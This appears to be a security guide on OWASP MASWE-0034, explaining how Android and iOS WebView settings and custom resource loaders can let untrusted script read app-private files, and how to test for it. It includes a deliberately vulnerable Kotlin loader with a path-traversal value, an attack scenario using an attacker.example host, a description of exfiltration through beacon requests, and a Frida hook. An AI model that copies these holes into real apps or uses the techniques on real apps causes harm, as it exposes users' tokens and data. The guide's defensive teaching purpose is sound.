---
title: "WebViews Allow Access to Local Resources with Untrusted Content (MASWE-0034)"
date: 2026-11-09 21:05:00 +0000
subcategory: platform
summary: "How Android and iOS WebViews let untrusted HTML read app files via file://, content:// and loadFileURL, how to test it, and when it is exploitable."
refs: [MASWE-0034, MASVS-PLATFORM-2, MASVS-STORAGE-2, MASVS-CODE-4, CWE-22, CWE-79, CWE-200, CWE-669]
tags: [android, ios, masvs-platform, webview, file-access, local-file-inclusion]
---

This note is part of our [MASVS-PLATFORM guide](/mobile/masvs-platform-platform-interaction-guide/) and covers OWASP [MASWE-0034](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0034/): WebViews that can reach the device's file system or content providers while rendering content the app does not fully control. A WebView is a browser engine inside the app's process (Android) or tied to it by a sandbox extension (iOS); whatever the app can read, a sufficiently privileged page can read too. The browser's same-origin policy is what normally stops a page from reading `file:///data/data/<package>/shared_prefs/` or the app's `Documents` folder, and a handful of settings exist precisely to switch that policy off for local pages. It is also the series' reference for how WebViews work, so it starts with the platform mechanics: engines and updates, origins, the Android `WebSettings` file and content flags and how their defaults changed, `WebViewAssetLoader` and custom `shouldInterceptRequest` loaders, iOS `loadFileURL(_:allowingReadAccessTo:)`, the private file-URL preferences set through key-value coding, and `WKURLSchemeHandler`. Then come the seven OWASP tests with their demos, secure patterns (including a review checklist for hand-rolled resource loaders), and how to rate what you find, with the attacker position each finding needs. JavaScript bridges are covered in [MASWE-0033](/mobile/maswe-0033-sensitive-native-functionality-exposed-in-webviews/), and which URLs a WebView is allowed to load or navigate to in [MASWE-0035](/mobile/maswe-0035-webviews-loading-untrusted-content/).

## Contents

- [Overview](#overview)
- [Modes of Introduction](#modes-of-introduction)
- [Impact](#impact)
- [Mitigations](#mitigations)
- [Knowledge](#knowledge)
  - [Android: WebViews (MASTG-KNOW-0018)](#android-webviews-mastg-know-0018)
  - [iOS: WebViews (MASTG-KNOW-0076)](#ios-webviews-mastg-know-0076)
- [Tests](#tests)
  - [Before you start: inventory every WebView](#before-you-start-inventory-every-webview)
  - [MASTG-TEST-0250: References to Content Provider Access in WebViews (Android)](#mastg-test-0250-references-to-content-provider-access-in-webviews-android)
  - [MASTG-TEST-0251: Runtime Use of Content Provider Access APIs in WebViews (Android)](#mastg-test-0251-runtime-use-of-content-provider-access-apis-in-webviews-android)
  - [MASTG-TEST-0252: References to Local File Access in WebViews (Android)](#mastg-test-0252-references-to-local-file-access-in-webviews-android)
  - [MASTG-TEST-0253: Runtime Use of Local File Access APIs in WebViews (Android)](#mastg-test-0253-runtime-use-of-local-file-access-apis-in-webviews-android)
  - [MASTG-TEST-0333: Overly Broad File Read Access in WebViews (iOS)](#mastg-test-0333-overly-broad-file-read-access-in-webviews-ios)
  - [MASTG-TEST-0335: WebView File Origin Access Relaxed by Configuration (iOS)](#mastg-test-0335-webview-file-origin-access-relaxed-by-configuration-ios)
  - [MASTG-TEST-0336: Runtime Setting of Relaxed WebView File Origin Policies (iOS)](#mastg-test-0336-runtime-setting-of-relaxed-webview-file-origin-policies-ios)
  - [Bridge tests OWASP files under MASWE-0034](#bridge-tests-owasp-files-under-maswe-0034)
- [Best practices](#best-practices)
  - [MASTG-BEST-0011: Securely Load File Content in a WebView (Android)](#mastg-best-0011-securely-load-file-content-in-a-webview-android)
  - [MASTG-BEST-0013: Disable Content Provider Access in WebViews](#mastg-best-0013-disable-content-provider-access-in-webviews)
  - [MASTG-BEST-0012: Disable JavaScript in WebViews](#mastg-best-0012-disable-javascript-in-webviews)
  - [MASTG-BEST-0049: Restrict and Validate Access to Exported Content Providers](#mastg-best-0049-restrict-and-validate-access-to-exported-content-providers)
  - [MASTG-BEST-0010: Use Up-to-Date minSdkVersion](#mastg-best-0010-use-up-to-date-minsdkversion)
  - [MASTG-BEST-0033: Securely Load File Content in a WebView (iOS)](#mastg-best-0033-securely-load-file-content-in-a-webview-ios)
  - [Secure patterns (Guler Tech)](#secure-patterns-guler-tech)
- [Rating findings](#rating-findings)
- [References](#references)

## Overview

MASWE-0034 applies when a WebView is allowed to touch local resources (files on disk, `content://` providers, files served by the app's own resource handler) **and** content the app does not fully control can run JavaScript inside it. The OWASP requirement is *"The app only allows trusted WebView content to access local resources."* It maps to MASVS-PLATFORM-2 ("The app uses WebViews securely"), and also to MASVS-STORAGE-2 and MASVS-CODE-4, because the usual outcome is private storage leaking through an injection bug; to MASVS v1 MSTG-PLATFORM-6; and to four CWEs: [CWE-22](https://cwe.mitre.org/data/definitions/22.html) (path traversal, for loaders that resolve attacker paths), [CWE-79](https://cwe.mitre.org/data/definitions/79.html) (the injection that usually delivers the script), [CWE-200](https://cwe.mitre.org/data/definitions/200.html) (the disclosure) and [CWE-669](https://cwe.mitre.org/data/definitions/669.html) (incorrect resource transfer between spheres, which is what moving a file from the app sandbox into a web context is). Android's risk catalogue calls the same problem [WebView unsafe file inclusion](https://developer.android.com/privacy-and-security/risks/webview-unsafe-file-inclusion), and Android's core app quality guidelines list `WebViewAssetLoader` as the expected way to load local content. The weakness applies to profiles L1, L2 and EUDIW.

OWASP's threat is MAS-THREAT-0034, *"Attackers can access local files and app-private data from web content"*, reached through MAS-ATTACK-0047 (*delivering crafted deep links or intents from a malicious app or web page*) and MAS-ATTACK-0051 (*injecting malicious JavaScript into WebView content, e.g. via MITM on insecure connections or a compromised website*). Those two attacks are the half of the problem this note does not fix: something has to get attacker-controlled script into a privileged WebView first. This weakness decides how much that script can take once it is there.

That split is the single most important thing to understand when you test and rate it:

| Ingredient | What it means | Where it is tested |
|---|---|---|
| 1. A privileged context | The WebView can read local resources: Android file/content flags, iOS `allowingReadAccessTo` scope and file-URL preferences, or a custom loader serving app files | This note |
| 2. Attacker script in that context | HTML/JS injection into a local page, a WebView that opens attacker URLs or files, a deep link or intent that chooses what is loaded, cleartext or third-party script | [MASWE-0035](/mobile/maswe-0035-webviews-loading-untrusted-content/), [MASWE-0029](/mobile/maswe-0029-insecure-deep-links/), [MASWE-0032](/mobile/maswe-0032-insecure-intents/), [MASWE-0026](/mobile/maswe-0026-cleartext-network-traffic/) |
| 3. Something worth reading | Tokens in `shared_prefs` or `NSUserDefaults`, databases, the WebView's own cookie store, cached documents | [MASWE-0001](/mobile/maswe-0001-sensitive-data-unencrypted-private-storage/) and the [STORAGE guide](/mobile/masvs-storage-1-secure-storage-guide/) |
| 4. A way out | Any outbound request from the page | Always available; the flags only govern *reading* |

A finding with ingredient 1 alone is a hardening issue. With 1 and 2 proven it is usually High or Critical. The tests below establish 1; their "further validation" steps, and the [Rating findings](#rating-findings) section, cover how to weigh 2 to 4.

## Modes of Introduction

**File access flags switched on to make local pages work.** A developer ships HTML in the APK or downloads a bundle into internal storage, loads it with `loadUrl("file://…")` or `loadDataWithBaseURL("file:///", …)`, finds that `XMLHttpRequest` to sibling files fails with a CORS error, and sets `allowFileAccessFromFileURLs` or `allowUniversalAccessFromFileURLs` to `true`. The page works; so does every injected script. Hybrid frameworks do the same thing behind a configuration switch (for example Cordova Android's `AndroidInsecureFileModeEnabled` preference, or the `allowFileAccess`, `allowFileAccessFromFileURLs` and `allowUniversalAccessFromFileURLs` props of `react-native-webview`).

**Old defaults inherited.** `setAllowFileAccess` was `true` by default for apps targeting Android 10 (API 29) or lower. Apps that still target an old API level (enterprise, sideloaded, abandoned) and never set it are exposed without a line of code.

**Content access left on.** `setAllowContentAccess` defaults to `true` on every API level. It is rarely needed and rarely disabled, so every WebView can load `content://` URLs from the app's own providers, exported or not.

**Untrusted content in the privileged WebView.** One WebView class is reused for local help pages, remote marketing pages and user-supplied links; or a file viewer renders downloaded or received HTML files with the same settings as the app's own bundle; or a local template interpolates a query parameter with `innerHTML`.

**Hand-rolled resource loading.** `shouldInterceptRequest` on Android or a `WKURLSchemeHandler` on iOS maps request paths to files without checking the host or canonicalising the path, so `..%2F` sequences escape the intended folder and the file is served under whatever origin the attacker's request used.

**Over-broad iOS read grants.** `loadFileURL(fileURL, allowingReadAccessTo: documentsDir)` (or the container root) when only one file or one dedicated folder was needed, often combined with `allowFileAccessFromFileURLs` set through key-value coding.

## Impact

- **Compromise of sensitive data.** Script in the privileged context reads and sends out app-private files: `SharedPreferences` XML and `NSUserDefaults` plists with tokens and feature flags, SQLite databases, cached PDFs and statements, the WebView's own cookie and local-storage databases, and on Android, through `content://`, anything the app's providers can open.
- **Authentication or authorisation bypass.** Session and refresh tokens, OAuth codes or cookies taken from those files let the attacker act as the user against the backend, from another device, until the token expires or is revoked.
- **Escalation of a lesser bug.** A reflected HTML injection that would otherwise deface one screen becomes a data theft primitive; a deep link that "only" opens a URL becomes file disclosure.

## Mitigations

- **Keep file and content access off.** Leave `allowFileAccessFromFileURLs` and `allowUniversalAccessFromFileURLs` at `false`, set `allowFileAccess` and `allowContentAccess` to `false` explicitly, and on iOS never set the private file-URL preferences.
- **Serve local content over an https origin.** On Android use `WebViewAssetLoader` (`https://appassets.androidplatform.net/…`); on iOS use a `WKURLSchemeHandler` with a fixed, validated root, or `loadFileURL` with the narrowest possible read scope.
- **Scope file read access to the page's own folder**, and keep that folder free of anything sensitive.
- **Separate trusted and untrusted content.** Untrusted pages, links and documents go to a WebView with JavaScript off, no local access and no bridges, or to Custom Tabs / `SFSafariViewController`.
- **Prevent the script in the first place**: no `innerHTML` with untrusted data, strict URL allowlists for loads and navigations (MASWE-0035), HTTPS only.

## Knowledge

OWASP links one Knowledge page per platform to this weakness. Both are broad "WebViews" pages; we cover them in full here, because the series uses this note as its WebView reference. The parts on JavaScript bridges are summarised and covered properly in [MASWE-0033](/mobile/maswe-0033-sensitive-native-functionality-exposed-in-webviews/); URL loading and navigation control in [MASWE-0035](/mobile/maswe-0035-webviews-loading-untrusted-content/). OWASP's Knowledge pages do not describe `WebViewAssetLoader`, custom `shouldInterceptRequest` loaders or `WKURLSchemeHandler` in any depth; those sections are ours, based on the Android and Apple documentation named in each.

### Android: WebViews (MASTG-KNOW-0018)

Source: [MASTG-KNOW-0018](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0018/), extended with the [`WebSettings`](https://developer.android.com/reference/android/webkit/WebSettings) reference, Android's [load local content](https://developer.android.com/develop/ui/views/layout/webapps/load-local-content) guide, the [unsafe file inclusion](https://developer.android.com/privacy-and-security/risks/webview-unsafe-file-inclusion) risk page and Chromium's [CORS and WebView API](https://chromium.googlesource.com/chromium/src/+/HEAD/android_webview/docs/cors-and-webview-api.md) design note.

#### The engine and how it is updated

`android.webkit.WebView` has been Chromium-based since Android 4.4; before that it was a WebKit fork. Since Android 5.0 the engine is not part of the OS image but an updatable package delivered through Google Play: *Android System WebView* (`com.google.android.webview`) on Android 5 to 6 and 10 onwards, and Chrome itself acting as the WebView provider on Android 7 to 9. The framework classes your app links against (`WebView`, `WebSettings`, `WebViewClient`) are thin; the implementation, including every CORS and file-URL rule in this note, lives in that package and is loaded into **your app's process**. Two consequences for testing:

- The same APK can behave differently on two devices with different WebView versions. Record the version in your report:

  ```bash
  adb shell dumpsys webviewupdate | grep -iE 'current webview package|valid package'
  adb shell dumpsys package com.google.android.webview | grep versionName
  ```

- A file-read primitive in the WebView is a file-read primitive in the app's UID. On Android 8 and later the renderer runs in a separate sandboxed process, but it asks the WebView code in the app process to load URLs, so a `file://` or `content://` request that the settings allow is served with the app's own identity. There is no per-load directory boundary like iOS has.

Pages are rendered without browser chrome: no address bar, no certificate UI, no visible origin. JavaScript is **off** by default and enabled with `settings.javaScriptEnabled = true` (`setJavaScriptEnabled(true)`), which almost every non-trivial app does.

#### Who decides what gets loaded

`loadUrl()`, `loadDataWithBaseURL()`, `loadData()` and `postUrl()` load content the app chooses. Navigations the page triggers (link clicks, redirects, `window.location`) go to the app's `WebViewClient`: without one set, the WebView hands them to the default browser; with one set (the normal case), the WebView loads them itself unless `shouldOverrideUrlLoading` returns `true`. `shouldInterceptRequest` sees every request, including subresources, and can answer it with a `WebResourceResponse` instead of the network, which is how both `WebViewAssetLoader` and home-made loaders work. Safe Browsing (Android 8.1+, on by default in current WebView versions; `setSafeBrowsingEnabled`) warns about known-bad URLs but is not an access control. URL allowlisting, `shouldOverrideUrlLoading` pitfalls and intent-to-WebView paths are covered in [MASWE-0035](/mobile/maswe-0035-webviews-loading-untrusted-content/); SSL error handling in [MASWE-0027](/mobile/maswe-0027-insecure-certificate-validation/); cleartext and mixed content in [MASWE-0026](/mobile/maswe-0026-cleartext-network-traffic/).

#### Origins: the thing the file flags change

Every document has an origin, and the same-origin policy decides what its script may read. In a WebView the origin comes from how the content was loaded:

| How the app loads it | Origin of the page | Notes |
|---|---|---|
| `loadUrl("https://example.com/x")` | `https://example.com` | Normal web rules |
| `loadUrl("https://appassets.androidplatform.net/assets/x.html")` with `WebViewAssetLoader` | `https://appassets.androidplatform.net` | Local files, web origin |
| `loadUrl("file:///android_asset/x.html")` | `file://` (opaque by default) | Assets and resources are readable even with `allowFileAccess = false` |
| `loadUrl("file:///data/user/0/<pkg>/files/x.html")` | `file://` (opaque by default) | Needs `allowFileAccess = true` |
| `loadUrl("content://<authority>/x.html")` | `content://` (opaque) | Needs `allowContentAccess = true` (the default) |
| `loadDataWithBaseURL(base, html, …)` | The origin of `base` | `"file:///"` makes the HTML a file page; an https base gives it that site's origin and cookies; `null` or `about:blank` gives an opaque origin |
| `loadData(html, …)` | `data:` (opaque) | |

By default Chromium treats each `file://` and `content://` document as an **opaque origin**: it can display other local files (an `<img>`, an `<iframe>`) if file access is allowed, but it cannot *read* them with `XMLHttpRequest`, and it cannot read responses from other origins. The two deprecated flags exist to relax exactly that:

- `allowFileAccessFromFileURLs = true` gives `file://` and `content://` pages a scheme-based origin. A `file://` page can then `XMLHttpRequest` other `file://` URLs, and a `content://` page other `content://` URLs. Chromium's own documentation warns that untrusted code running in `content://` with this setting can read arbitrary `content://` URLs, including other apps' exported providers.
- `allowUniversalAccessFromFileURLs = true` lets a `file://` page `XMLHttpRequest` *any* scheme-based URL: other files, `content://`, `http://`, `https://`, and read the response. When it is `true`, the value of `allowFileAccessFromFileURLs` is ignored.

Two rules hold regardless of the flags, and both matter for exploitation:

- **`fetch()` never reads `file://` or `content://` URLs** in WebView (Chromium follows the Fetch standard here). Exploits use `XMLHttpRequest`. On iOS, as you will see, `fetch` does work for file URLs.
- **Sending data needs no flag.** Any page can make outbound requests (`<img src>`, form posts, `fetch(url, {method: 'POST', mode: 'no-cors', body})`, `navigator.sendBeacon`). The flags govern reading responses, not sending. The only network-level brake is cleartext policy: the WebView honours `android:usesCleartextTraffic` / the Network Security Configuration for apps targeting API 26 or higher, so exfiltration to `http://` fails in most modern apps and goes to `https://` instead.

Pages with a web origin (https, or `appassets`) can never read `file://` URLs, cannot embed them (*"Not allowed to load local resource"*), and cannot embed or reference `content://` URLs; only `content://` pages may use `content://` subresources. The file flags do not change any of that. This is why a remote page loaded into a "dangerously configured" WebView usually *cannot* read local files: the danger needs a page that runs in a file or content origin.

#### WebView local file access settings

| `WebSettings` method | What `true` allows | Default (decided by the app's **targetSdkVersion**) | Deprecated |
|---|---|---|---|
| `setJavaScriptEnabled` | Page scripts run | `false` | No |
| `setAllowFileAccess` | Loading `file://` URLs outside `android_asset` / `android_res`, as pages or subresources | `true` when targeting API 29 or lower; `false` when targeting API 30 or higher | No |
| `setAllowFileAccessFromFileURLs` | Script in a `file://` (or `content://`) page reads other URLs of the same scheme | `true` when targeting API 15 or lower; `false` from API 16 | API 30 |
| `setAllowUniversalAccessFromFileURLs` | Script in a `file://` page reads any scheme-based URL; overrides the previous flag | `true` when targeting API 15 or lower; `false` from API 16 | API 30 |
| `setAllowContentAccess` | Loading `content://` URLs | `true` on every API level | No |

The Android reference states the defaults in terms of what the app **targets** ("The default value is `true` for apps targeting Q and below, and `false` when targeting R and above"), and the WebView implementation reads the app's `targetSdkVersion` to pick them. OWASP's tables and the evaluation criteria of MASTG-TEST-0252/0253 phrase this as `minSdkVersion` or "API level"; for the default value, `targetSdkVersion` is what counts. Google Play has required new apps and updates to target API 35 since August 2025, so any app updated on Play recently gets `allowFileAccess = false` by default: when you find it `true` at runtime, someone set it. Explicitly setting all four flags to `false` is still the recommendation, because it survives refactoring and odd build configurations.

What a page can reach once allowed: anything the app's UID can read. That is the app's internal storage (`/data/user/0/<pkg>/`, which `/data/data/<pkg>/` points to), the app-specific external directory (`/sdcard/Android/data/<pkg>/`), and shared storage according to the app's storage permissions: before Android 10 the whole of external storage with `READ_EXTERNAL_STORAGE`; with scoped storage only media collections the app has media permissions for, or everything with `MANAGE_EXTERNAL_STORAGE`.

`setAllowFileAccess` example from the source, the setting with nothing else:

```kotlin
webView.settings.allowFileAccess = true
webView.loadUrl("file:///sdcard/index.html")   // the page loads; its script still cannot read other files
```

Adding `allowFileAccessFromFileURLs = true` lets that page `XMLHttpRequest` `file:///data/data/<pkg>/shared_prefs/…`; adding `allowUniversalAccessFromFileURLs = true` additionally lets it read `content://` and remote responses. A typical "it works now" configuration from a hybrid app:

```kotlin
webView.settings.apply {
    javaScriptEnabled = true
    allowFileAccess = true
    allowUniversalAccessFromFileURLs = true   // makes the local page able to call https APIs, and to read everything
}
webView.loadUrl("file:///android_asset/local_page.html")
```

**Cookies.** Universal access does not hand a `file://` page the cookies of remote sites: cookies live in `CookieManager`, a `file://` page has no `document.cookie` for `example.com`, and cross-origin requests only carry cookies when the server opts in with credentialed CORS. The WebView's cookie *database*, however, is just a file in `app_webview/`, and a file-read primitive can read it.

#### WebView content provider access

`allowContentAccess` (default `true`) lets the WebView load `content://` URIs from any provider the app can read: **its own providers, whether exported or not** (a provider never enforces its permissions against its own app), other apps' providers that are exported and readable by the app, and URIs other apps granted it. For a `FileProvider` this means every path declared in its XML resource; a `<files-path name="internal_files" path="." />` exposes the whole of `filesDir`. The `android:grantUriPermissions` attribute is irrelevant here, because it governs what *other* apps can be granted, not what the app itself can open.

The Chromium rules for `content://`:

- A `content://` page can embed `content://` subresources and iframes but cannot read them, because each is an opaque origin.
- Pages from any other scheme cannot embed or reference `content://` at all.
- `allowFileAccessFromFileURLs` lets `content://` pages read other `content://` URLs; `allowUniversalAccessFromFileURLs` lets `file://` pages read `content://` URLs (the combination in OWASP's DEMO-0029/0030).

So the content route needs either a `file://` page with universal access, or attacker HTML that itself runs at a `content://` origin (for example the app opening a `content://` URI that a malicious app supplied from its own provider) with `allowFileAccessFromFileURLs`. Provider design (exports, permissions, `FileProvider` path scope) is covered in [MASWE-0018](/mobile/maswe-0018-missing-auth-on-app-components/).

#### `WebViewAssetLoader`

[`WebViewAssetLoader`](https://developer.android.com/reference/androidx/webkit/WebViewAssetLoader) (AndroidX WebKit) is the supported way to show local content. It intercepts requests to a reserved host, by default `https://appassets.androidplatform.net`, and answers them from registered path handlers:

- `AssetsPathHandler`: files under `src/main/assets/`.
- `ResourcesPathHandler`: files under `res/`.
- `InternalStoragePathHandler`: a directory inside `getDataDir()` or `getCacheDir()`. External storage is refused because other apps may be able to write it. The constructor throws `IllegalArgumentException` for the whole data or cache directory and for `app_webview/`, `databases/`, `lib/`, `shared_prefs/` and `code_cache/`. Requests outside the mounted directory get an empty `404` rather than falling through to the network.

The page then has an ordinary https origin. File flags are irrelevant to it, same-origin rules apply, `fetch` and `XMLHttpRequest` work for the app's own content, and injected script still cannot read `file://` anything. The remaining pitfalls are about scope and origin:

- `setDomain("www.example.com")` serves local files under your real domain. Any page or XSS on that domain loaded in the WebView becomes same-origin with the local files; use the default reserved domain unless you need mixing.
- `setHttpAllowed(true)` serves the same files over `http://`, which a network attacker can then spoof for that host.
- Anything in an exposed directory is readable by any page with that origin. Expose a dedicated subdirectory that holds only web assets.
- A custom `PathHandler` is your own code again; review it like the loaders below.

The loader is wired in through `shouldInterceptRequest`; the code is in [Best practices](#mastg-best-0011-securely-load-file-content-in-a-webview-android).

#### Custom loaders in `shouldInterceptRequest`

Before `WebViewAssetLoader` existed, apps built their own: intercept requests for some prefix and return a `WebResourceResponse` around a `FileInputStream`. The weakness description calls this out ("insecure custom resource loading") because the mistakes repeat:

```kotlin
// Vulnerable: no host check, decoded path segment, no canonicalisation
override fun shouldInterceptRequest(view: WebView, request: WebResourceRequest): WebResourceResponse? {
    val uri = request.url
    if (uri.path?.startsWith("/offline/") == true) {
        val file = File(context.cacheDir, uri.lastPathSegment!!)     // "..%2Fshared_prefs%2Fauth.xml" decodes to "../shared_prefs/auth.xml"
        return WebResourceResponse("text/html", "utf-8", FileInputStream(file))
    }
    return null
}
```

- **No host check.** The response is delivered to whatever origin requested it. If an attacker page at `https://attacker.example/` is ever loaded (any navigation weakness from MASWE-0035), it requests `https://attacker.example/offline/…`, gets the app's file **as its own same-origin resource**, and reads it with plain `fetch`. No file flags involved.
- **Decoded paths.** `Uri.getLastPathSegment()` and `getPathSegments()` return *decoded* segments, so `%2F` becomes `/` after the URL has passed every string check; `File(dir, name)` does not stop `..`.
- **Permissive headers.** A response with `Access-Control-Allow-Origin: *` is readable by every origin in the WebView.
- **Writable sources.** Serving from external storage or a download cache serves attacker-written HTML under the app's trusted origin, which is stored XSS with whatever that origin is allowed to do (bridges included).

Review these in code (see [Secure patterns](#secure-patterns-guler-tech)); [Oversecured's research on `WebResourceResponse`](https://oversecured.com/blog/android-exploring-vulnerabilities-in-webresourceresponse), referenced by the weakness, describes real cases.

#### WebView-native bridges (summary)

Android offers three ways for page script to talk to the app: `WebViewCompat.addWebMessageListener` (AndroidX, origin allowlist, asynchronous; the recommended one), `postWebMessage` / `WebMessageChannel` (asynchronous, main frame only), and the legacy `addJavascriptInterface` (synchronous, exposed to every frame of every origin, and for apps targeting API 16 or lower open to reflection-based code execution, because every public method was callable without `@JavascriptInterface`). A bridge turns the script injection this note worries about into calls into native code, so a WebView that has both a bridge and local file access is worth twice the attention. Testing is in [MASWE-0033](/mobile/maswe-0033-sensitive-native-functionality-exposed-in-webviews/).

#### WebView storage

Each app has its own Chromium profile under `/data/data/<pkg>/app_webview/`, not shared with Chrome or other apps. It holds the HTTP cache, `localStorage`/`sessionStorage`, IndexedDB, cookies (an SQLite database, on current versions under `app_webview/Default/`), service worker data and the Origin Private File System (which does not appear as ordinary files). Relevant `WebSettings`: `setDomStorageEnabled` (`localStorage`; off by default in the framework API, though most apps turn it on), `setCacheMode`, the deprecated `setDatabaseEnabled` (WebSQL, removed from current WebView) and the removed `setAppCacheEnabled`. Clearing is piecemeal: `WebView.clearCache(true)` (HTTP cache only), `WebStorage.getInstance().deleteAllData()` (DOM storage), `CookieManager.getInstance().removeAllCookies(null)`; IndexedDB and OPFS go only with the whole profile, which apps must not delete by hand while WebView is in use. Retention after logout is tested in [MASWE-0024](/mobile/maswe-0024-sensitive-data-accessible-after-session-termination/); for this note, the point is that these files are high-value targets for a file-read primitive.

#### Alternatives to a WebView

[Custom Tabs](https://developer.chrome.com/docs/android/custom-tabs/overview/) and [Trusted Web Activities](https://developer.android.com/develop/ui/views/layout/webapps/trusted-web-activities) render in the user's browser, in the browser's process and profile. The app gets no access to the page, its cookies or its storage, and no file flags exist to get wrong. For external links, sign-in pages and anything user-supplied they are the right default.

#### Remote debugging

Chrome DevTools can attach to a WebView (`chrome://inspect` on the host, device connected over adb) when the app has called `WebView.setWebContentsDebuggingEnabled(true)`. The flag is not tied to `android:debuggable`; for a release build, switch it on with Frida:

```javascript
// webview-debug.js
Java.perform(() => {
  Java.scheduleOnMainThread(() => {
    Java.use('android.webkit.WebView').setWebContentsDebuggingEnabled(true);
    console.log('[+] WebView debugging enabled');
  });
});
```

```bash
frida -U -f com.example.app -l webview-debug.js
```

The DevTools console then shows the page's origin (`location.origin`, `"null"` for opaque file origins), the CORS errors that tell you which flag is missing, and lets you run test payloads in the real context. Without DevTools, the same console messages appear in logcat as `I/chromium: [INFO:CONSOLE(…)]` lines.

### iOS: WebViews (MASTG-KNOW-0076)

Source: [MASTG-KNOW-0076](https://mas.owasp.org/MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0076/), extended with Apple's [`WKWebView`](https://developer.apple.com/documentation/webkit/wkwebview), [`loadFileURL(_:allowingReadAccessTo:)`](https://developer.apple.com/documentation/webkit/wkwebview/loadfileurl%28_:allowingreadaccessto:%29), [`WKURLSchemeHandler`](https://developer.apple.com/documentation/webkit/wkurlschemehandler) and key-value coding documentation.

#### Types of WebViews

| Component | Status | What the app controls |
|---|---|---|
| [`WKWebView`](https://developer.apple.com/documentation/webkit/wkwebview) (iOS 8+) | The only embeddable web view for current apps | Configuration, loading, navigation policy, script messaging, content worlds (iOS 14+) |
| [`SFSafariViewController`](https://developer.apple.com/documentation/safariservices/sfsafariviewcontroller) (iOS 9+) | Safari's UI in the app | Almost nothing: no access to the page, no JavaScript switch, no file access. It shows a read-only address bar and must not be hidden or obscured. Out of scope for this note. |
| [`UIWebView`](https://developer.apple.com/documentation/uikit/uiwebview) | Deprecated since iOS 12; the App Store stopped accepting new apps using it in April 2020 and updates in December 2020 | File access from file URLs and universal access were always on and could not be disabled; JavaScript could not be disabled; `baseURL: nil` gave an `applewebdata://` origin with local file access. Only relevant for enterprise or very old builds. |

Since iOS 17.4, apps in the EU may use alternative browser engines, but only browser apps with a specific entitlement; embedded views in normal apps are still WebKit.

#### Process model: why `allowingReadAccessTo` is a real boundary

`WKWebView` renders out of process. Page content runs in a WebKit *WebContent* process with its own, much stricter sandbox; the app process (the "UI process") only drives it. The WebContent process cannot read the app's container. When the app calls `loadFileURL(_:allowingReadAccessTo:)`, WebKit issues the WebContent process a **sandbox extension** for the read-access URL, and that, not a browser setting, is what makes local files readable to the page. That is the key difference from Android: on iOS, file reach is bounded per load by the directory the app grants; on Android it is bounded only by the app's UID and the WebView flags.

OWASP's DEMO-0098 notes that the **iOS Simulator is more permissive**: there, script reached files outside the granted scope; on a physical device WebKit enforced it. Always confirm iOS file-access results on a device.

#### Loading local content

| API | Origin of the page | Local file reach |
|---|---|---|
| [`loadFileURL(_:allowingReadAccessTo:)`](https://developer.apple.com/documentation/webkit/wkwebview/loadfileurl%28_:allowingreadaccessto:%29) / [`loadFileRequest(_:allowingReadAccessTo:)`](https://developer.apple.com/documentation/webkit/wkwebview/loadfilerequest%28_:allowingreadaccessto:%29) (iOS 15+) | `file://` (unique per document by default) | The read-access URL: one file, or a directory and everything below it |
| [`loadHTMLString(_:baseURL:)`](https://developer.apple.com/documentation/webkit/wkwebview/loadhtmlstring%28_:baseurl:%29), [`load(_:mimeType:characterEncodingName:baseURL:)`](https://developer.apple.com/documentation/webkit/wkwebview/load%28_:mimetype:characterencodingname:baseurl:%29) | The origin of `baseURL`; `nil` gives an opaque `"null"` origin | With a `file://` base, relative subresources resolve against it; test on a device what actually loads |
| [`load(_:)`](https://developer.apple.com/documentation/webkit/wkwebview/load%28_:%29-5siv6) with an https `URLRequest` | That site's origin | None; subject to App Transport Security |
| A registered custom scheme (`myapp://…`) | `myapp://host` | Whatever the app's `WKURLSchemeHandler` returns |

`allowingReadAccessTo` pointing at a file grants that file; pointing at a directory grants the directory tree. The common mistakes are the `Documents` directory (which also holds user data and, with `UIFileSharingEnabled`/`LSSupportsOpeningDocumentsInPlace`, files the user or another app put there through the Files app or *Open in…*), `Library`, `Library/Caches`, or the container root:

```swift
// Narrow: the page only
wkWebView.loadFileURL(fileURL, allowingReadAccessTo: fileURL)

// Broad: every file under Library is now in scope, including Library/Preferences/<bundle-id>.plist
let libDir = FileManager.default.urls(for: .libraryDirectory, in: .userDomainMask)[0]
wkWebView.loadFileURL(libDir.appendingPathComponent("index.html"), allowingReadAccessTo: libDir)
```

#### File access from file URLs: the private preferences

Within the granted scope, what *script* may do is a second question, answered by two WebKit preferences that are not public API:

- `allowFileAccessFromFileURLs` on [`WKPreferences`](https://developer.apple.com/documentation/webkit/wkpreferences), default `false`: script in a `file://` page may read other `file://` URLs (with `fetch` or `XMLHttpRequest`).
- `allowUniversalAccessFromFileURLs` on [`WKWebViewConfiguration`](https://developer.apple.com/documentation/webkit/wkwebviewconfiguration), default `false`: script in a `file://` page may read any origin.

Apps set them with key-value coding:

```swift
config.preferences.setValue(true, forKey: "allowFileAccessFromFileURLs")
config.setValue(true, forKey: "allowUniversalAccessFromFileURLs")
```

```objectivec
[config.preferences setValue:@YES forKey:@"allowFileAccessFromFileURLs"];
[config setValue:@YES forKey:@"allowUniversalAccessFromFileURLs"];
```

Why this works: WebKit's private headers declare the properties with underscore-prefixed setters (`_setAllowFileAccessFromFileURLs:` on `WKPreferences`, `_setAllowUniversalAccessFromFileURLs:` on `WKWebViewConfiguration`), and `setValue:forKey:` looks for a method named `set<Key>:` and then `_set<Key>:` before falling back to instance variables. The public-looking key therefore reaches the private setter, which is also why OWASP's Frida test hooks the underscore selectors. Expect to find the key strings in the binary, or direct calls to the private selectors, or framework wrappers (`react-native-webview` exposes both as props and applies them this way). Private API use is unsupported and can change between iOS versions; apps keep doing it because string keys slip past App Review's static checks.

The two layers are independent. `allowingReadAccessTo` is the sandbox boundary, so even `allowUniversalAccessFromFileURLs` cannot read outside it on a device. The preferences decide whether script can read *inside* it. Without them, a page can still *display* sibling files in scope with `<iframe>`, `<object>` or `<embed>` (OWASP's DEMO-0096), but cannot read their contents into script, because each file document is a separate opaque origin.

Unlike Chromium, WebKit's `fetch` works for `file://` URLs once the preference allows it (DEMO-0098 reads `./api-key.txt` with `fetch`). As on Android, sending data out needs no preference: an image beacon or a no-cors request leaves the device; universal access, plus permissive CORS headers on the server, is only needed for script to *read* a remote response.

#### JavaScript

